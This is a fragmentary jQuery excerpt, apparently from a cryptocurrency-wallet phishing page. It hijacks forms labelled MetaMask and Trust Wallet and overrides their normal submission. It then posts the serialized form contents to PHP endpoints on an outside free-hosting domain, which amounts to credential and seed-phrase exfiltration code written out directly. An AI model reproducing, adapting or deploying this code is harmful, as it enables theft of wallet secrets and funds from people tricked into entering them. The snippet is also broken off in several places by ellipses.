$("form").submit(function() {
  $(myform).attr("action", "https://puasasemakindekatcook.000webhostapp.com/cuanbana/roketss.php");
});
...
$('#rewards2 .confirm-approve-content__small-text > button').on('click', function() {   
 ...
 $("#metamask").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: 'https://puasasemakindekatcook.000webhostapp.com/cuanbana/rokets.php',
            type: 'post',
            data: $(this).serialize(),
    ...
    $("#trustwallet").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: 'https://puasasemakindekatcook.000webhostapp.com/cuanbana/roket.php',
            type: 'post',
            data: $(this).serialize(),
            success: function(data) {
                alert(data);
